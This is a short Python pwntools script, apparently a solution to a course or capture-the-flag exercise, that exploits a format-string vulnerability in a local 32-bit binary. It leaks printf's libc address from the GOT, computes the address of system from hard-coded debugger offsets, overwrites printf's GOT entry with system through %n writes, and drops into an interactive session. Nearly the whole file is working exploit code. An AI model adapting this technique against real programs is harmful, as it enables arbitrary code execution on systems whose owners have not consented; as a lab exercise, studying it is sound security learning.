#!/usr/bin/env python

from pwn import *
import os

env = {
        "PATH": "/home/users/didnera/week6/c-fs-code-exec-32"
        }


p = process("./fs-code-exec-32",env=env)

print(p.recv())

#AAAA%7$p -> is 7th argument (as input)
#Set break point point at printf call,
#x/x esp, value has our input
#x/20x $esp, then count





#arb read
#GOT of printf
got_of_printf = p.elf.got["printf"]
p.sendline(p32(got_of_printf) + "%7$s")


data = p.recv()

libc_printf = u32(data[10:14])


print(repr(data))

print(hex(libc_printf))

'''
pwndbg> print system
$1 = {<text variable, no debug info>} 0xf7d72da0 <__libc_system>
pwndbg> print printf
$2 = {<text variable, no debug info>} 0xf7d81670 <__printf>
'''

libc_system = libc_printf - 0xf7d81670 + 0xf7d72da0


#arb write
#check args
#7 first 4 bytes, 8 second 4 bytes
#AAAABBBB%7p%8p
#as input

buf = p32(got_of_printf) + p32(got_of_printf + 2)

lower_16 = libc_system & 0xffff

first = lower_16 - 8

second = (libc_system >> 16) - lower_16

while second < 0:
    second += 0x10000


print(hex(libc_system))
print(hex(first))

print(hex(second))

buf += "%" +  "%05d" % first + "x"
buf += "%7$n"
buf += "%" + "%05d" % second + "x"
buf += "%8$n"

p.sendline(buf)


p.interactive()